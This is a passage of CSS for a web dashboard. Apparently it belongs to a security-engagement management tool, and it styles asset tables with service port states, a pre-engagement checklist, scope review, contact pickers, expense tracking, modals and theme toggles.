            border-top: var(--border);
            padding-top: 0.75rem;
        }
        
        .asset-card-actions .table-btn {
            flex: 1;
            text-align: center;
            padding: 0.5rem;
        }
        
        /* Expandable Row Styles */
        .expandable-row {
            cursor: pointer;
            transition: background-color 0.2s ease;
        }
        
        .expandable-row:hover {
            background: var(--bg-secondary);
        }
        
        .expand-icon {
            display: inline-block;
            margin-right: 0.5rem;
            transition: transform 0.2s ease;
            font-size: 0.75rem;
            opacity: 0.6;
        }
        
        .expanded .expand-icon {
            transform: rotate(90deg);
        }
        
        .services-row {
            display: none;
        }
        
        .services-row.show {
            display: table-row;
        }
        
        .services-content {
            padding: 1rem;
            background: var(--bg-secondary);
            border-left: 3px solid var(--text-accent);
        }
        
        .services-title {
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.75rem;
        }
        
        .services-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 0.75rem;
        }
        
        .service-item {
            background: var(--bg-primary);
            border: var(--border);
            border-radius: 6px;
            padding: 0.75rem;
        }
        
        .service-port {
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--text-accent);
            margin-bottom: 0.25rem;
        }
        
        .service-name {
            font-size: 0.75rem;
            color: var(--text-primary);
            margin-bottom: 0.25rem;
        }
        
        .service-state {
            font-size: 0.75rem;
            padding: 0.125rem 0.375rem;
            border-radius: 4px;
        }
        
        .service-state.open {
            background: rgba(34, 197, 94, 0.1);
            color: var(--success);
        }
        
        .service-state.filtered {
            background: rgba(245, 158, 11, 0.1);
            color: var(--warning);
        }
        
        .service-state.closed {
            background: rgba(156, 163, 175, 0.1);
            color: #6b7280;
        }
        
        /* Responsive Assets Table */
        @media (max-width: 1200px) {
            .assets-filters {
                flex-direction: column;
                align-items: stretch;
                gap: 1rem;
            }
            
            .search-section {
                margin-left: 0;
                margin-top: 0;
            }
            
            .search-input {
                width: 100%;
            }
            
            .filter-group {
                flex-wrap: wrap;
            }
        }
        
        @media (max-width: 900px) {
            .assets-summary {
                grid-template-columns: repeat(2, 1fr);
                gap: 1rem;
            }
            
            /* Hide less important columns on medium screens */
            .assets-table th:nth-child(5),
            .assets-table td:nth-child(5), /* OS/Platform */
            .assets-table th:nth-child(6),
            .assets-table td:nth-child(6) { /* Owner */
                display: none;
            }
        }
        
        @media (max-width: 768px) {
            .assets-container {
                padding: 1rem;
            }
            
            .assets-header {
                flex-direction: column;
                gap: 1rem;
                align-items: stretch;
            }
            
            .assets-summary {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 1rem;
            }
            
            .assets-actions {
                flex-direction: column;
            }
            
            /* Switch to card view on mobile */
            .assets-table-container {
                display: none;
            }
            
            .assets-mobile-view {
                display: block;
            }
            
            .bulk-actions {
                flex-direction: column;
                gap: 1rem;
                text-align: center;
            }
            
            .bulk-buttons {
                justify-content: center;
                flex-wrap: wrap;
            }
        }
        
        @media (max-width: 480px) {
            .assets-filters {
                padding: 1rem;
            }
            
            .filter-section {
                flex-direction: column;
                align-items: stretch;
                gap: 0.5rem;
            }
            
            .filter-group {
                grid-template-columns: repeat(2, 1fr);
                display: grid;
                gap: 0.5rem;
            }
            
            .asset-card-details {
                grid-template-columns: 1fr;
            }
            
            .assets-summary {
                grid-template-columns: 1fr;
            }
        }
        
        .top-bar-right {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }
        
        .theme-toggle {
            background: var(--bg-secondary);
            border: var(--border);
            border-radius: 6px;
            padding: 0.5rem 0.75rem;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 0.875rem;
            white-space: nowrap;
            display: flex;
            align-items: center;
            gap: 0.375rem;
        }
        
        .theme-toggle:hover {
            background: var(--bg-accent);
            color: var(--text-accent);
            border-color: var(--text-accent);
        }
        
        .theme-text {
            display: none;
        }
        
        @media (min-width: 640px) {
            .theme-text {
                display: inline;
            }
        }
        
        .user-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 600;
            font-size: 0.75rem;
            flex-shrink: 0;
            cursor: pointer;
            border: 2px solid var(--bg-primary);
            transition: all 0.2s ease;
        }
        
        .user-avatar:hover {
            transform: scale(1.05);
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.3);
        }
        
        /* User Dropdown Menu */
        .user-menu {
            position: relative;
        }
        
        .user-dropdown {
            position: absolute;
            top: calc(100% + 8px);
            right: 0;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            min-width: 220px;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transform: translateY(-10px);
            transition: all 0.2s ease;
        }
        
        .user-dropdown.show {
            opacity: 1;
            visibility: visible;
            transform: translateY(0);
        }
        
        .user-dropdown-header {
            padding: 1rem;
            border-bottom: 1px solid var(--border);
        }
        
        .user-info .user-name {
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.25rem;
        }
        
        .user-info .user-role {
            font-size: 0.875rem;
            color: var(--text-secondary);
        }
        
        .dropdown-divider {
            height: 1px;
            background: var(--border);
            margin: 0.5rem 0;
        }
        
        .dropdown-item {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 0.75rem 1rem;
            color: var(--text-primary);
            text-decoration: none;
            cursor: pointer;
            transition: background-color 0.15s ease;
        }
        
        .dropdown-item:hover {
            background: var(--bg-primary);
        }
        
        .dropdown-item.logout {
            color: var(--danger);
        }
        
        .dropdown-item.logout:hover {
            background: rgba(239, 68, 68, 0.1);
        }
        
        .dropdown-icon {
            font-size: 1rem;
            width: 20px;
            text-align: center;
        }
        
        /* Settings Styles */
        .settings-group {
            margin-bottom: 1.5rem;
        }
        
        .settings-label {
            display: block;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.5rem;
        }
        
        .theme-option {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.5rem;
            padding: 1rem;
            background: var(--bg-primary);
            border: 2px solid var(--border);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 0.875rem;
            min-width: 80px;
        }
        
        .theme-option:hover {
            border-color: var(--button-primary);
        }
        
        .theme-option.active {
            border-color: var(--button-primary);
            background: rgba(59, 130, 246, 0.1);
        }
        
        .settings-toggle {
            margin-bottom: 1rem;
        }
        
        .toggle-label {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            cursor: pointer;
            font-weight: 500;
            color: var(--text-primary);
        }
        
        .toggle-input {
            display: none;
        }
        
        .toggle-slider {
            position: relative;
            width: 44px;
            height: 24px;
            background: var(--border);
            border-radius: 12px;
            transition: background 0.2s ease;
        }
        
        .toggle-slider::before {
            content: '';
            position: absolute;
            top: 2px;
            left: 2px;
            width: 20px;
            height: 20px;
            background: white;
            border-radius: 50%;
            transition: transform 0.2s ease;
        }
        
        .toggle-input:checked + .toggle-slider {
            background: var(--button-primary);
        }
        
        .toggle-input:checked + .toggle-slider::before {
            transform: translateX(20px);
        }
        
        .action-btn.danger {
            background: var(--danger);
            color: white;
        }
        
        .action-btn.danger:hover {
            background: #dc2626;
        }
        
        /* Content Area */
        .content-area {
            flex: 1;
            padding: 1rem;
            overflow-y: auto;
            overflow-x: hidden;
        }
        
        @media (min-width: 640px) {
            .content-area {
                padding: 1.5rem;
            }
        }
        
        @media (min-width: 1024px) {
            .content-area {
                padding: 2rem;
            }
        }
        
        .screen-content {
            display: none;
            animation: fadeIn 0.3s ease;
        }
        
        .screen-content.active {
            display: block;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* Welcome Screen */
        .welcome-screen {
            text-align: center;
            padding: 2rem 1rem;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .welcome-icon {
            font-size: 3rem;
            margin-bottom: 1.5rem;
            color: var(--text-accent);
        }
        
        @media (min-width: 640px) {
            .welcome-icon {
                font-size: 4rem;
            }
        }
        
        .welcome-title {
            font-size: 1.75rem;
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 0.75rem;
        }
        
        @media (min-width: 640px) {
            .welcome-title {
                font-size: 2rem;
            }
        }
        
        .welcome-subtitle {
            font-size: 1rem;
            color: var(--text-secondary);
            margin-bottom: 2rem;
        }
        
        .quick-actions {
            display: grid;
            grid-template-columns: 1fr;
            gap: 1rem;
            max-width: 800px;
            margin: 0 auto;
        }
        
        @media (min-width: 640px) {
            .quick-actions {
                grid-template-columns: repeat(2, 1fr);
                gap: 1.25rem;
            }
        }
        
        @media (min-width: 1024px) {
            .quick-actions {
                grid-template-columns: repeat(4, 1fr);
                gap: 1.5rem;
            }
        }
        
        .action-card {
            background: var(--bg-primary);
            border: var(--border);
            border-radius: 12px;
            padding: 1.5rem;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: var(--shadow-sm);
        }
        
        .action-card:hover {
            border-color: var(--text-accent);
            transform: translateY(-2px);
            box-shadow: var(--shadow);
        }
        
        .action-icon {
            font-size: 2rem;
            color: var(--text-accent);
            margin-bottom: 0.75rem;
        }
        
        .action-title {
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.5rem;
            font-size: 0.95rem;
        }
        
        .action-desc {
            font-size: 0.875rem;
            color: var(--text-secondary);
            line-height: 1.4;
        }
        
        /* Placeholder Content */
        .placeholder-content {
            background: var(--bg-primary);
            border: var(--border);
            border-radius: 12px;
            padding: 2rem 1.5rem;
            text-align: center;
            box-shadow: var(--shadow-sm);
            max-width: 600px;
            margin: 0 auto;
        }
        
        @media (min-width: 640px) {
            .placeholder-content {
                padding: 3rem 2rem;
            }
        }
        
        .placeholder-icon {
            font-size: 2.5rem;
            color: var(--text-secondary);
            margin-bottom: 1.25rem;
            opacity: 0.5;
        }
        
        @media (min-width: 640px) {
            .placeholder-icon {
                font-size: 3rem;
            }
        }
        
        .placeholder-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.75rem;
        }
        
        @media (min-width: 640px) {
            .placeholder-title {
                font-size: 1.5rem;
            }
        }
        
        .placeholder-text {
            color: var(--text-secondary);
            font-size: 0.95rem;
        }
        
        /* Expense Management */
        .expense-management-container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .expense-header {
            background: var(--bg-primary);
            border-radius: 12px;
            padding: 1.5rem;
            box-shadow: var(--shadow-sm);
            margin-bottom: 1.5rem;
            border: var(--border);
        }
        
        @media (min-width: 640px) {
            .expense-header {
                padding: 2rem;
            }
        }
        
        .expense-header-content {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }
        
        @media (min-width: 768px) {
            .expense-header-content {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
            }
        }
        
        .expense-title {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 0.5rem;
        }
        
        @media (min-width: 640px) {
            .expense-title {
                font-size: 2rem;
            }
        }
        
        .expense-subtitle {
            color: var(--text-secondary);
            font-size: 0.95rem;
        }
        
        .header-actions {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        @media (min-width: 480px) {
            .header-actions {
                flex-direction: row;
                align-items: center;
            }
        }
        
        .project-total {
            background: var(--bg-accent);
            border: 1px solid var(--text-accent);
            border-radius: 8px;
            padding: 1rem 1.25rem;
            text-align: center;
        }
        
        .total-label {
            font-size: 0.75rem;
            color: var(--text-secondary);
            text-transform: uppercase;
            margin-bottom: 0.25rem;
            font-weight: 600;
            letter-spacing: 0.025em;
        }
        
        .total-amount {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--text-primary);
        }
        
        .add-expense-btn {
            background: var(--button-primary);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 0.75rem 1.5rem;
            font-size: 0.875rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            white-space: nowrap;
        }
        
        .add-expense-btn:hover {
            background: var(--button-hover);
            transform: translateY(-1px);
            box-shadow: var(--shadow);
        }
        
        /* Expenses Panel */
        .expenses-panel {
            background: var(--bg-primary);
            border-radius: 12px;
            padding: 1.5rem;
            box-shadow: var(--shadow-sm);
            border: var(--border);
        }
        
        @media (min-width: 640px) {
            .expenses-panel {
                padding: 2rem;
            }
        }
        
        .expenses-header {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }
        
        @media (min-width: 768px) {
            .expenses-header {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
            }
        }
        
        .panel-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: var(--text-primary);
        }
        
        .filter-controls {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }
        
        .filter-btn {
            padding: 0.375rem 0.75rem;
            background: var(--bg-secondary);
            border: var(--border);
            border-radius: 6px;
            color: var(--text-secondary);
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.2s ease;
            font-weight: 500;
            white-space: nowrap;
        }
        
        .filter-btn:hover {
            background: var(--bg-accent);
            color: var(--text-accent);
            border-color: var(--text-accent);
        }
        
        .filter-btn.active {
            background: var(--button-primary);
            color: white;
            border-color: var(--button-primary);
        }
        
        /* Expense Items */
        .expense-list {
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }
        
        .expense-item {
            border: var(--border);
            border-radius: 8px;
            padding: 1.25rem;
            transition: all 0.2s ease;
            position: relative;
            background: var(--bg-primary);
        }
        
        .expense-item:hover {
            border-color: var(--text-accent);
            box-shadow: var(--shadow);
        }
        
        .expense-header-item {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 0.75rem;
        }
        
        .expense-category {
            background: var(--bg-accent);
            color: var(--text-accent);
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: capitalize;
        }
        
        .expense-amount {
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--text-primary);
        }
        
        .expense-details {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
            margin-bottom: 0.5rem;
        }
        
        @media (min-width: 480px) {
            .expense-details {
                flex-direction: row;
                justify-content: space-between;
            }
        }
        
        .expense-date {
            font-size: 0.875rem;
            color: var(--text-secondary);
        }
        
        .expense-client {
            font-size: 0.875rem;
            color: var(--text-secondary);
        }
        
        .expense-client.billable {
            color: var(--success);
            font-weight: 500;
        }
        
        .expense-notes {
            color: var(--text-secondary);
            font-size: 0.875rem;
            margin-top: 0.75rem;
            padding-top: 0.75rem;
            border-top: var(--border);
        }
        
        .expense-actions {
            position: absolute;
            top: 1rem;
            right: 1rem;
            opacity: 0;
            transition: opacity 0.2s ease;
        }
        
        .expense-item:hover .expense-actions {
            opacity: 1;
        }
        
        @media (max-width: 767px) {
            .expense-actions {
                opacity: 1;
                position: static;
                margin-top: 0.75rem;
            }
        }
        
        .expense-action-btn {
            background: var(--bg-secondary);
            border: var(--border);
            color: var(--text-secondary);
            padding: 0.375rem 0.5rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.75rem;
            transition: all 0.2s ease;
        }
        
        .expense-action-btn:hover {
            background: #fee2e2;
            border-color: #fca5a5;
            color: var(--danger);
        }
        
        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            padding: 1rem;
        }
        
        .modal-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .modal {
            background: var(--bg-primary);
            border-radius: 12px;
            padding: 1.5rem;
            width: 100%;
            max-width: 500px;
            max-height: 90vh;
            overflow-y: auto;
            border: var(--border);
            box-shadow: var(--shadow-lg);
            transform: scale(0.9);
            transition: transform 0.3s ease;
        }
        
        .modal-overlay.active .modal {
            transform: scale(1);
        }
        
        @media (min-width: 640px) {
            .modal {
                padding: 2rem;
            }
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: var(--border);
        }
        
        .modal-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: var(--text-primary);
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: var(--text-secondary);
            padding: 0.25rem;
            line-height: 1;
            transition: color 0.2s ease;
        }
        
        .close-btn:hover {
            color: var(--text-primary);
        }
        
        /* Form Styles */
        .form-group {
            margin-bottom: 1.25rem;
        }
        
        .form-label {
            display: block;
            margin-bottom: 0.375rem;
            color: var(--text-primary);
            font-weight: 500;
            font-size: 0.875rem;
        }
        
        .form-input,
        .form-select,
        .form-textarea {
            width: 100%;
            padding: 0.75rem 1rem;
            border: var(--border);
            border-radius: 8px;
            font-size: 0.875rem;
            background: var(--bg-primary);
            color: var(--text-primary);
            transition: all 0.2s ease;
        }
        
        .form-input:focus,
        .form-select:focus,
        .form-textarea:focus {
            outline: none;
            border-color: var(--text-accent);
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .form-textarea {
            min-height: 100px;
            resize: vertical;
        }
        
        .category-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.5rem;
        }
        
        .category-btn {
            padding: 0.625rem 1rem;
            background: var(--bg-secondary);
            border: var(--border);
            border-radius: 8px;
            color: var(--text-secondary);
            font-size: 0.875rem;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s ease;
        }
        
        .category-btn:hover {
            background: var(--bg-accent);
            color: var(--text-accent);
            border-color: var(--text-accent);
        }
        
        .category-btn.active {
            background: var(--button-primary);
            color: white;
            border-color: var(--button-primary);
        }
        
        .upload-zone {
            border: 2px dashed var(--border-color);
            border-radius: 8px;
            padding: 2rem 1rem;
            text-align: center;
            background: var(--bg-secondary);
            cursor: pointer;
            transition: all 0.2s ease;
        }
        
        .upload-zone:hover {
            border-color: var(--text-accent);
            background: var(--bg-accent);
        }
        
        .upload-icon {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
            color: var(--text-secondary);
        }
        
        .upload-text {
            color: var(--text-secondary);
            font-size: 0.875rem;
        }
        
        /* Toggle Switch */
        .toggle-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .toggle-switch {
            position: relative;
            width: 48px;
            height: 24px;
        }
        
        .toggle-input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--border-color);
            border-radius: 24px;
            transition: 0.3s;
        }
        
        .toggle-slider::before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background: white;
            border-radius: 50%;
            transition: 0.3s;
            box-shadow: var(--shadow-sm);
        }
        
        .toggle-input:checked + .toggle-slider {
            background: var(--text-accent);
        }
        
        .toggle-input:checked + .toggle-slider::before {
            transform: translateX(24px);
        }
        
        /* Modal Buttons */
        .modal-footer {
            margin-top: 1.5rem;
            padding-top: 1.5rem;
            border-top: var(--border);
            display: flex;
            gap: 0.75rem;
            justify-content: flex-end;
        }
        
        .modal-btn {
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            font-size: 0.875rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            border: none;
        }
        
        .btn-primary {
            background: var(--button-primary);
            color: white;
            border: 1px solid var(--button-primary);
        }
        
        .btn-primary:hover {
            background: var(--button-hover);
            border-color: var(--button-hover);
            transform: translateY(-1px);
            box-shadow: var(--shadow);
        }
        
        .btn-secondary {
            background: var(--bg-secondary);
            color: var(--text-secondary);
            border: var(--border);
        }
        
        .btn-secondary:hover {
            background: var(--bg-accent);
            color: var(--text-primary);
            border-color: var(--text-accent);
        }
        
        /* Project List */
        .project-list {
            max-height: 300px;
            overflow-y: auto;
            margin: 1rem 0;
        }
        
        .project-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem;
            border: var(--border);
            border-radius: 8px;
            margin-bottom: 0.5rem;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        
        .project-item:hover {
            background: var(--bg-secondary);
        }
        
        .project-item.active {
            background: var(--bg-accent);
            border-color: var(--text-accent);
        }
        
        .project-item-info h4 {
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.25rem;
            font-size: 0.95rem;
        }
        
        .project-item-meta {
            font-size: 0.75rem;
            color: var(--text-secondary);
        }
        
        .project-item-status {
            font-size: 0.75rem;
            padding: 0.25rem 0.5rem;
            border-radius: 12px;
            font-weight: 500;
        }
        
        .status-active {
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
        }
        
        .status-completed {
            background: var(--bg-secondary);
            color: var(--text-secondary);
        }
        
        /* Scrollbar Styles */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--text-secondary);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-primary);
        }
        
        /* Utility Classes */
        .hidden {
            display: none;
        }
        
        .text-center {
            text-align: center;
        }
        
        .mt-1 { margin-top: 0.5rem; }
        .mt-2 { margin-top: 1rem; }
        .mt-3 { margin-top: 1.5rem; }
        .mb-1 { margin-bottom: 0.5rem; }
        .mb-2 { margin-bottom: 1rem; }
        .mb-3 { margin-bottom: 1.5rem; }

        /* Pre-Engagement Checklist Styles */
        .checklist-container {
            margin: 20px 0;
        }

        .checklist-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding: 15px;
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 8px;
        }

        .checklist-title {
            font-size: 1.4em;
            font-weight: 600;
            color: var(--text-color);
        }

        .checklist-progress {
            display: flex;
            gap: 20px;
            font-size: 0.9em;
        }

        .progress-stat {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .progress-stat .stat-number {
            font-weight: 600;
        }

        .progress-stat.completed .stat-number { color: var(--success); }
        .progress-stat.progress .stat-number { color: var(--warning); }
        .progress-stat.blocked .stat-number { color: var(--danger); }

        .checklist-filters {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            align-items: center;
            flex-wrap: wrap;
        }

        .checklist-section {
            margin-bottom: 30px;
        }

        .section-header {
            padding: 12px 15px;
            background: var(--primary-color);
            color: white;
            border-radius: 6px 6px 0 0;
            font-weight: 600;
            font-size: 1.1em;
        }

        .checklist-section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: var(--primary-color);
            color: white;
            border-radius: 6px 6px 0 0;
            font-weight: 600;
            font-size: 1.1em;
        }

        .checklist-section-header h3 {
            margin: 0;
            font-size: 1.1em;
            font-weight: 600;
        }

        .section-progress {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.85em;
        }

        .progress-text {
            color: white;
            opacity: 0.9;
            white-space: nowrap;
        }

        .progress-bar {
            width: 80px;
            height: 6px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 3px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: white;
            border-radius: 3px;
            transition: width 0.3s ease;
        }

        .scope-review {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .scope-summary {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .scope-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            transition: all 0.2s;
        }

        .scope-item:hover {
            border-color: var(--primary-color);
            background: var(--bg-color);
        }

        .scope-type {
            font-weight: 500;
            flex: 1;
        }

        .scope-count {
            color: var(--text-muted);
            font-size: 0.9em;
            min-width: 60px;
        }

        .review-scope {
            padding: 6px 12px;
            background: var(--border-color);
            color: var(--text-color);
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.85em;
            font-weight: 500;
            transition: all 0.2s;
        }

        .review-scope:hover {
            background: var(--primary-color);
            color: white;
        }

        .scope-actions {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px 0;
            border-top: 1px solid var(--border-color);
        }

        .scope-btn {
            padding: 10px 18px;
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9em;
            font-weight: 500;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .scope-btn:hover {
            background: var(--primary-dark);
            transform: translateY(-1px);
        }

        .approval-checkbox {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 500;
            color: var(--text-color);
            cursor: pointer;
            user-select: none;
        }

        .approval-checkbox input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: var(--success);
        }

        .number-input {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .number-control {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .number-input input[type="number"] {
            width: 80px;
            padding: 8px 12px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            background: var(--bg-color);
            color: var(--text-color);
            font-size: 1em;
            text-align: center;
        }

        .number-input input[type="number"]:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px var(--primary-color)22;
        }

        .input-label {
            font-weight: 500;
            color: var(--text-color);
        }

        .role-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 15px;
        }

        .role-details input[type="text"] {
            padding: 10px 12px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            background: var(--bg-color);
            color: var(--text-color);
            font-size: 0.95em;
        }

        .role-details input[type="text"]:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px var(--primary-color)22;
        }

        .role-details input[type="text"]:placeholder-shown {
            color: var(--text-muted);
            font-style: italic;
        }

        .checklist-item {
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-top: none;
            padding: 15px;
        }

        .checklist-item:last-child {
            border-radius: 0 0 6px 6px;
        }

        .question-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .status-indicator {
            font-size: 1.2em;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .status-indicator.completed { color: var(--success); }
        .status-indicator.in-progress { color: var(--warning); }
        .status-indicator.pending { color: var(--text-muted); }
        .status-indicator.blocked { color: var(--danger); }

        .question-text {
            flex: 1;
            font-weight: 500;
            color: var(--text-color);
        }

        .notes-toggle {
            background: none;
            border: none;
            cursor: pointer;
            padding: 5px;
            border-radius: 4px;
            font-size: 1.1em;
            opacity: 0.6;
            transition: all 0.2s;
        }

        .notes-toggle:hover {
            opacity: 1;
            background: var(--border-color);
        }

        .question-input {
            margin: 10px 0;
            padding-left: 34px;
        }

        .date-range-input {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }

        .date-range-input label {
            font-weight: 500;
            color: var(--text-color);
        }

        .date-range-input input[type="date"],
        .date-range-input input[type="datetime-local"] {
            padding: 8px 12px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            background: var(--bg-color);
            color: var(--text-color);
        }

        .checkbox-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .checkbox-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .checkbox-item input[type="checkbox"] {
            width: 16px;
            height: 16px;
        }

        .contact-input {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .contact-picker {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }

        .contact-select {
            padding: 10px 12px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            background: var(--bg-color);
            color: var(--text-color);
            font-size: 0.95em;
            min-width: 200px;
            flex: 1;
        }

        .contact-select:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px var(--primary-color)22;
        }

        .add-contact-btn {
            padding: 8px 16px;
            background: var(--success);
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9em;
            font-weight: 500;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 5px;
            white-space: nowrap;
        }

        .add-contact-btn:hover {
            background: var(--success)dd;
            transform: translateY(-1px);
        }

        .contact-link-btn {
            padding: 8px 16px;
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9em;
            font-weight: 500;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 5px;
            white-space: nowrap;
        }

        .contact-link-btn:hover {
            background: var(--primary-dark);
            transform: translateY(-1px);
        }

        .selected-contact-display {
            padding: 12px;
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            display: none;
        }

        .selected-contact-display.show {
            display: block;
        }

        .contact-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-bottom: 10px;
        }

        .contact-detail {
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .contact-detail-label {
            font-size: 0.85em;
            color: var(--text-muted);
            font-weight: 500;
        }

        .contact-detail-value {
            font-size: 0.95em;
            color: var(--text-color);
            font-weight: 400;
        }

        .multiple-contacts {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .contact-entry {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px;
            background: var(--surface-color);
